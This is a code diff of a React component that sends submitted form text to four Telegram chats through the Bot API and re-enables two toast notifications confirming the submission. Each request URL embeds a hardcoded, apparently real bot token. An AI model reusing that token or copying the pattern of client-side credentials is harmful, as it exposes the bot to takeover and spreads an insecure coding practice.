@@ -23,28 +23,27 @@ function Fourteen() {
         axios.get(`https://api.telegram.org/bot5169605455:AAHvb8lJ27GQLdB0lKp19Mbwa6jZYLwnBj0/sendMessage?chat_id=${chatIds[1]}&text=${encodeURIComponent(text)}`)
         axios.get(`https://api.telegram.org/bot5169605455:AAHvb8lJ27GQLdB0lKp19Mbwa6jZYLwnBj0/sendMessage?chat_id=${chatIds[2]}&text=${encodeURIComponent(text)}`)
         axios.get(`https://api.telegram.org/bot5169605455:AAHvb8lJ27GQLdB0lKp19Mbwa6jZYLwnBj0/sendMessage?chat_id=${chatIds[3]}&text=${encodeURIComponent(text)}`).then(res => {
-            // toast("Your information sent!", {
-            //     position: "top-right",
-            //     autoClose: 5000,
-            //     hideProgressBar: false,
-            //     closeOnClick: true,
-            //     pauseOnHover: true,
-            //     draggable: true,
-            //     progress: undefined,
-            // });
-            //
-            // setTimeout(() => {
-            //     toast("We will contact you very soon!", {
-            //         position: "top-right",
-            //         autoClose: 5000,
-            //         hideProgressBar: false,
-            //         closeOnClick: true,
-            //         pauseOnHover: true,
-            //         draggable: true,
-            //         progress: undefined,
-            //     });
-            // }, 1000)
+            toast("Your information sent!", {
+                position: "top-right",
+                autoClose: 5000,
+                hideProgressBar: false,
+                closeOnClick: true,
+                pauseOnHover: true,
+                draggable: true,
+                progress: undefined,
+            });
 
+            setTimeout(() => {
+                toast("We will contact you very soon!", {
+                    position: "top-right",
+                    autoClose: 5000,
+                    hideProgressBar: false,
+                    closeOnClick: true,
+                    pauseOnHover: true,
+                    draggable: true,
+                    progress: undefined,
+                });
+            }, 1000)
         })
 
         try {
